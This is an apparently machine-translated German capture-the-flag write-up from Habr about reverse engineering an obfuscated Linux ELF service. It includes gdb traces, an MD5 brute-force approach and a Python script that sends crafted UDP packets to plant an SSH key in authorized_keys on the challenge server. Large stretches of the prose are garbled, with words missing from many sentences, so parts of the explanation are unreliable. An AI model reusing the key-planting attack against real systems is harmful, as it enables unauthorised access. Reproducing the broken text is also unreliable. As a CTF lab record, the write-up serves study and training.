class="spoiler_text"><img src="https://habrastorage.org/webt/m1/6y/yn/m16yynqvryb1clqwwf6hsgv0mxs.jpeg"><br></div></div><br>  <b>Gesuchte</b> Zeile: <b>flag {76f98c7f11582d73303a4122fd04e48cba5498}</b> <br><br><img src="https://habrastorage.org/webt/yb/bw/am/ybbwamafhoijkcn2g871s_73wb8.jpeg"><br><br><h2><a name="Hiddenresource"></a>  Tag7.  Versteckte Ressource </h2><br>  Diese Aufgabe wurde von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">RuCTF</a> vorbereitet. <br><br>  <i>Angesichts des <a href="">n24.elf-</a> Dienstes.</i>  <i>Autorisieren Sie einfach auf 95.216.185.52 und erhalten Sie Ihre Flagge.</i> <br><br>  <b>Hinweise</b> <b><br></b>  <b><i>28.10.2008 20:00</i></b> <br>  <i>Aufgabe wurde nicht gelöst.</i>  <i>24 Stunden hinzugefügt.</i> <br><br>  Eine Untersuchung des Servers auf Zugriff unter Verwendung von Standardverbindungsprotokollen ergab den Zugriff über SSH (Port 22).  Die bereitgestellte Datei ist eine ausführbare ELF-Datei (die durch die Erweiterung im Namen subtil angedeutet wurde) für Linux. <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#file UwRJ8iaEEd4tSQIe_n24.elf UwRJ8iaEEd4tSQIe_n24.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped</span></span></code> </pre><br>  Bei Verwendung des Zeichenfolgen-Dienstprogramms wurden die Zeilen "/home/task/.ssh" und "/home/task/.ssh/authorized_keys" angezeigt.  Schlussfolgerung über die Möglichkeit des Zugriffs auf die kennwortlose SSH-Autorisierungsschlüsseldatei aus der ausführbaren ELF-Datei (im Folgenden als Dienst bezeichnet). <br><br>  Die Symboltabelle enthält die notwendigen Funktionen zum Öffnen und Schreiben von Dateien: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep fopen 23: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fopen@GLIBC_2.2.5 (2) # readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep write 32: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@GLIBC_2.2.5 (2)</span></span></code> </pre> <br>  Die Symboltabelle enthält auch Funktionen zum Arbeiten mit Sockets, zum Erstellen von Prozessen und zum Zählen von MD5. <br><br>  Die Rückseite der Datei zeigte das Vorhandensein einer großen Anzahl von Sprüngen (eine Art Verschleierung).  Gleichzeitig werden Sprünge zwischen Codeblöcken ausgeführt, die im Allgemeinen in verschiedene Typen unterteilt werden können: <br><br><ul><li>    «            OF »,   (  objdump): <br><br><pre> <code class="bash hljs"> 95b69b: 48 0f 44 c7 cmove rax,rdi 95b69f: 48 83 e7 01 and rdi,0x1 95b6a3: 4d 31 dc xor r12,r11 95b6a6: 71 05 jno 95b6ad &lt;MD5_Final@@Base+0x2d83f9&gt; 95b6a8: e9 f4 bf e1 ff jmp 7776a1 &lt;MD5_Final@@Base+0xf43ed&gt; 95b6ad: e9 1f 1a de ff jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt;</code> </pre> <br>  ,     OF        «xor», «and»  . </li><li> ,       .            .      ,  : <br><br><pre> <code class="bash hljs">95b401: c7 04 25 2b b4 95 00 mov DWORD PTR ds:0x95b42b,0x34be74 95b408: 74 be 34 00 95b40c: 66 c7 04 25 01 b4 95 mov WORD PTR ds:0x95b401,0x13eb 95b413: 00 eb 13 95b416: 4c 0f 44 da cmove r11,rdx 95b41a: 48 d1 ea shr rdx,1 95b41d: 48 0f 44 ca cmove rcx,rdx 95b421: 49 89 d3 mov r11,rdx 95b424: 48 89 ca mov rdx,rcx 95b427: 4c 89 da mov rdx,r11 95b42a: e9 8d ad e7 00 jmp 17d61bc</code> </pre> </li><li>  ,      . </li></ul><br>            MD5.       ,       .       « <b>MD5_Init</b> », « <b>MD5_Update</b> »  « <b>MD5_final</b> ». <br><br>  ,         API        .    ,     ,   ,      ,     .       . <br><br>   ELF  .    «/home/task/.ssh/»   . <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Beim Start müssen Sie den Port angeben. </font><font style="vertical-align: inherit;">Da wir den serverseitigen Start nicht steuern, dachte ich, dass dieser Parameter ein Dummy ist. </font><font style="vertical-align: inherit;">Der eigentliche Port sollte einer sein. </font><font style="vertical-align: inherit;">Netstat zeigte Open Port 5432 (UDP).</font></font><br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># netstat -ulnp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 0.0.0.0:5432 0.0.0.0:* 13611/./UwRJ8iaEEd4</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Wenn Sie ein Paket mit Daten an den angegebenen Port senden, wird eine Meldung über deren Überprüfung und einige Daten (4 Byte) vom Dienst angezeigt: </font></font><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#echo "test" &gt; /dev/udp/127.0.0.1/5432 # Verifying 74657374 009ec3b8</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Die Aufzählung verschiedener Daten ergab, dass die Ausgabe von ihrem Inhalt abhängt. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Als nächstes wird mit gdb debuggt. </font><font style="vertical-align: inherit;">Zunächst finde ich heraus, woher wir die Daten beziehen, einen Haltepunkt für Recvfrom und Backtrace. </font><font style="vertical-align: inherit;">Wir bekommen am Ende die Adresse 0x6ae010.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Übergangskette</font></font></b> <div class="spoiler_text"><pre> <code class="bash hljs">6ae00b: e8 d0 2b d5 ff call 400be0 &lt;recvfrom@plt&gt; 6ae010: e9 64 bc ea ff jmp 559c79 &lt;MD5_Update@@Base+0x953fc&gt; 559c79: 89 45 80 mov DWORD PTR [rbp-0x80],eax 559c7c: 83 f8 ff cmp eax,0xffffffff <span class="hljs-comment"><span class="hljs-comment">#   ,  -1 559c7f: 0f 84 62 7f 1c 00 je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; 559c85: e9 8a d6 2c 00 jmp 827314 &lt;MD5_Final@@Base+0x1a4060&gt; 827314: 48 c7 c7 30 d1 f0 00 mov rdi,0xf0d130 82731b: 48 29 27 sub QWORD PTR [rdi],rsp 82731e: 48 89 df mov rdi,rbx 827321: e8 5f 94 fe ff call 810785 &lt;MD5_Final@@Base+0x18d4d1&gt; 827326: e9 d7 a5 2d 00 jmp b01902 &lt;MD5_Init@@Base+0x7569&gt; b01902: 85 c0 test eax,eax b01904: 0f 84 dd 02 c2 ff je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; b0190a: e9 7c a9 bb ff jmp 6bc28b &lt;MD5_Final@@Base+0x38fd7&gt;</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rufen Sie in der Kette die Funktion unter 0x810758 auf und verarbeiten Sie das Ergebnis. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Setzen Sie break auf 0xb01902 und senden Sie das Datenpaket.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rückkehrcode (Rax-Register)</font></font></b> <div class="spoiler_text"> (gdb) b *0xb01902 <br> Breakpoint 2 at 0xb01902 <br> (gdb) c <br> Continuing. <br> Verifying 74657374 <br> 00f82488 <br><br> Breakpoint 2, 0x0000000000b01902 in MD5_Init () <br> (gdb) info reg rax <br> rax 0x0 0 <br></div></div><br>  0   . , ,          0. <br><br>       gdb,     <b>MD5_Update</b>     (  «test»). <br><br><div class="spoiler">  <b class="spoiler_title">Ergebnis</b> <div class="spoiler_text"><pre> <code class="bash hljs">(gdb) b MD5_Update Breakpoint 3 at 0x4c487d (2 locations) (gdb) c Continuing. Verifying 74657374 Breakpoint 3, 0x00000000004c487d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> MD5_Update () (gdb) info reg rsi rsi 0x7fffffffdd90 140737488346512 (gdb) x/20bx <span class="hljs-variable"><span class="hljs-variable">$rsi</span></span> 0x7fffffffdd90: 0x74 0x65 0x73 0x74 0x0a 0xff 0x7f 0x00 0x7fffffffdd98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdda0: 0x00 0x00 0x00 0x00 (gdb) info reg <span class="hljs-variable"><span class="hljs-variable">$rdx</span></span> rdx 0x200 512</code> </pre> <br></div></div><br><h4>  Ergebnis </h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5 wird anhand der von uns gesendeten Nachricht gezählt, die Größe der gelesenen Daten beträgt jedoch 512 Byte. Nachdem ich mit den Daten gespielt hatte, fand ich heraus, dass MD5 aus gesendeten Daten mit Nullen bis zu 512 Bytes gezählt wird. Sie müssen jedoch mindestens 8 Byte senden, um die auf dem Stapel gespeicherte 8-Byte-Nummer zu ersetzen. Anscheinend wurde dort eine Adresse gespeichert. Die vom Dienst für jedes eingehende Paket angezeigten 4 Bytes entsprechen den ersten 3 Bytes der MD5-Summe mit einer zusätzlichen Null. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ich kehrte zur Funktion 0x810758 und ihrem Rückkehrcode 0 zurück. Der Rückgabewert wird im RAX-Register gespeichert. Um den Rückkehrcode zu bestimmen, habe ich 2 Haltepunkte an der Adresse der Funktion 0x810758 und der Adresse nach ihrer Ausführung 0x827326 gesetzt. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ich habe die Daten gesendet, der Punkt bei 0x810758 hat funktioniert. Ich habe das Skript in gdb gestartet:</font></font><br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> gdb <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(<span class="hljs-string"><span class="hljs-string">"flow.log"</span></span>, <span class="hljs-string"><span class="hljs-string">"w"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fw: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>: s = gdb.execute(<span class="hljs-string"><span class="hljs-string">"info reg rip"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) s = s[s.find(<span class="hljs-string"><span class="hljs-string">"0x"</span></span>):] gdb.execute(<span class="hljs-string"><span class="hljs-string">"ni"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) address = s.split(<span class="hljs-string"><span class="hljs-string">"\t"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip() fw.write(address + <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>) address = int(address, <span class="hljs-number"><span class="hljs-number">16</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> address == <span class="hljs-number"><span class="hljs-number">0x827326</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span></code> </pre><br>   <b>flow.log</b>         .   ,     ,      . <br>   « <b>disasm.log</b> »     objdmp     « <b>: </b> »   . <br><br><div class="spoiler"> <b class="spoiler_title">   </b> <div class="spoiler_text"><pre> <code class="python hljs">F_NAME = <span class="hljs-string"><span class="hljs-string">"disasm.log"</span></span> F_FLOW = <span class="hljs-string"><span class="hljs-string">"flow.log"</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">prepare_code_flow</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(f_path)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(f_path, <span class="hljs-string"><span class="hljs-string">"rb"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fr: data = fr.readlines() data = filter(<span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> x: x, data) start_address = long(data[<span class="hljs-number"><span class="hljs-number">0</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) end_address = long(data[<span class="hljs-number"><span class="hljs-number">-1</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) res = [<span class="hljs-string"><span class="hljs-string">""</span></span>] * (end_address - start_address + <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> data: _d = _d.split(<span class="hljs-string"><span class="hljs-string">":"</span></span>) res[long(_d[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip(), <span class="hljs-number"><span class="hljs-number">16</span></span>) - start_address] = <span class="hljs-string"><span class="hljs-string">""</span></span>.join(_d[<span class="hljs-number"><span class="hljs-number">1</span></span>:]).strip() <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> start_address, res <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parse_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> mnem = code[:<span class="hljs-number"><span class="hljs-number">7</span></span>].strip() ops = code[<span class="hljs-number"><span class="hljs-number">7</span></span>:].split(<span class="hljs-string"><span class="hljs-string">","</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [mnem] + ops <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">process_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> parse_data = parse_instruction(code) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> parse_data[<span class="hljs-number"><span class="hljs-number">1</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> [<span class="hljs-string"><span class="hljs-string">"rax"</span></span>, <span class="hljs-string"><span class="hljs-string">"eax"</span></span>, <span class="hljs-string"><span class="hljs-string">"al"</span></span>]: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> __name__ == <span class="hljs-string"><span class="hljs-string">'__main__'</span></span>: <span class="hljs-comment"><span class="hljs-comment"># Prepare disassemble data start_address, codes = prepare_code_flow(F_NAME) with open(F_FLOW, "rb") as fr: lines = fr.readlines() lines.reverse() lines = filter(lambda x: x, lines) count = 0 for _l in lines: offset = long(_l.strip(), 16) - start_address if process_instruction(codes[offset]): print str(count) + " " + hex(offset + start_address) + " " + codes[offset] break count += 1 continue</span></span></code> </pre> <br><br></div></div><br>   «»       ,         RAX.  Ergebnis: <br> <code>0x67c27c mov DWORD PTR [rbp-0x14], 0x0</code> <br>    .      -  ( « <b>flow.log</b> »): <br><br><pre> <code class="plaintext hljs">95b6ad: jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt; 95b6b2: cmp DWORD PTR [rbp-0x2d4],0x133337 95b6bc: jne 67c270 &lt;MD5_Update@@Base+0x1b79f3&gt;</code> </pre> <br>  0x95b6b2 –     0x133337.  , ,   [rbp-0x2d4].       «testtest»: <br><br><pre> <code class="plaintext hljs"># echo -n "testtest" &gt; md5.bin # truncate -s 512 md5.bin # md5sum md5.bin e9b9de230bdc85f3e929b0d2495d0323 md5.bin # echo -n "testtest" &gt; /dev/udp/127.0.0.1/5432 (gdb) b *0x95b6b2 Breakpoint 6 at 0x95b6b2 (gdb) c Continuing. Verifying 74657374 00deb9e9 Breakpoint 6, 0x000000000095b6b2 in MD5_Final () (gdb) x/20bx $rbp-0x2d4 0x7fffffffdd7c: 0xe9 0xb9 0xde 0x00 0xe9 0xb9 0xde 0x23 0x7fffffffdd84: 0x0b 0xdc 0x85 0xf3 0xe9 0x29 0xb0 0xd2 0x7fffffffdd8c: 0x49 0x5d 0x03 0x23</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Passen Sie die ersten 3 Bytes der MD5-Summe an. Die Lösung besteht darin, die MD5-Summe mit den ersten 3 Bytes "\ x37 \ x33 \ x13" zu erhalten. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ein einfaches Skript, um Zahlen von Null mit der Berechnung in binärer Form MD5 bis zur gewünschten Übereinstimmung zu durchlaufen. Erforderliche Daten zum Senden empfangen. Wir senden Daten und erhalten vom Dienst eine Nachricht über die Ernennung eines neuen Ports für den Datenempfang:</font></font><br><br><pre> <code class="plaintext hljs">New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...3 14235 0</code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netstat hat diesen Port und tatsächlich keine neuen Ports angezeigt. Aber ps zeigte das Vorhandensein eines beendeten Kinderprozesses (Zombies). Die Idee kam, dass der Port für eine Weile im untergeordneten Prozess geöffnet wird. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ich habe das notwendige Paket an Port 5432 und danach an Port 14223 gesendet. Und nichts. Der Port hat aufgehört zu öffnen. Als Ergebnis habe ich andere Daten und dementsprechend MD5 mit dem richtigen Start generiert. Nachricht erneut, diesmal jedoch mit einem anderen Port. Nach dem Neustart des Dienstes funktionierte der erste MD5 erneut mit Port 14235. Es bestand die Idee, dass sich der Dienst an den verbrauchten MD5 erinnert. Daher habe ich es jedes Mal getestet, wenn ich den Dienst neu gestartet habe.</font></font><br><br><div class="spoiler">  <b class="spoiler_title">Ergebnis</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">Binding 22 Waiting for data...Verifying 1BFFFFFFD1FFFFFF8B50 00133337 New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...Received packet from 127.0.0.1:43614 Data: 3 14235 27 Next port 23038 Binding 23038 Waiting for data...4</code> </pre> <br></div></div><br>   .    ,      … <br>   ,     (31841)  .      gdb       ,    «/home/task/.ssh/authorized_keys». <br><br>        ,      .       ,          ( ,     ). <br><br>   RSA    . <br><br>      SSH,    . <br><br>          MD5-.        ,          (    ).     ,     4    (   MD5)    int  ,         (  ). <br><br><div class="spoiler"> <b class="spoiler_title"> ,     RSA,   .</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> SocketServer <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> select d = [<span class="hljs-string"><span class="hljs-string">'\x1b\xd1\x8bP\x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'\x16\xbc\xf9 \x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'"\xa5I\x90\x00\x00\x00\x00\x00\x00'</span></span>] s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 1"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">0</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 2"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">1</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 3"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">2</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 4"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">41357</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 5"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x04"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">42381</span></span>)) <span class="hljs-comment"><span class="hljs-comment"># for i in range(256): time.sleep(0.2) print "Send 6" s.sendto("\x02", ("95.216.185.52", 28709)) # Read key with open("ssh_key.txt", "rb") as fr: data = fr.read() print len(data) print "Send 7" s.sendto(data, ("95.216.185.52", 28709)) print s.recvfrom(1500) s.close()</span></span></code> </pre> <br></div></div><br>  : <b>flag{a1ec3c43cae4250faa302c412c7cc524}</b> <br><br>     «OK»  . <br><br>  ,   ,       MD5-.  ,      ,  . <br><br>  ,   ,  40       ,    .  Vielen Dank. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de440312/">https://habr.com/ru/post/de440312/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de440302/index.html">CRM - Erfolgskosten, Fehlerkosten, Betriebskosten</a></li>
<li><a href="../de440304/index.html">Interrupts von externen Geräten in einem x86-System. Teil 3. Konfigurieren des Interrupt-Routings im Chipsatz anhand des Coreboot-Beispiels</a></li>
<li><a href="../de440306/index.html">Datenbankskalierung in hoch belasteten Systemen</a></li>
<li><a href="../de440308/index.html">Teilen und erobern oder langsam schreiben - schnell lesen</a></li>
<li><a href="../de440310/index.html">Wie man einer Maschine beibringt, Rechnungen zu verstehen und Daten daraus zu extrahieren</a></li>
<li><a href="../de440314/index.html">JDK 12 Release Candidate: Shenandoah, G1, JMH, Arm64. Bugs in Swing schlagen zurück</a></li>
<li><a href="../de440316/index.html">Gleichmäßige Verteilung der Punkte in einem Dreieck</a></li>
<li><a href="../de440318/index.html">DSGVO: Wie Sie mit den persönlichen Daten Ihrer Mitarbeiter, Freiberufler und europäischen Kontrahenten arbeiten</a></li>
<li><a href="../de440320/index.html">Als wir im DMRSE Yandex Zähler getaktet haben</a></li>
<li><a href="../de440322/index.html">Warum Festplatten weniger wahrscheinlich ausfallen</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>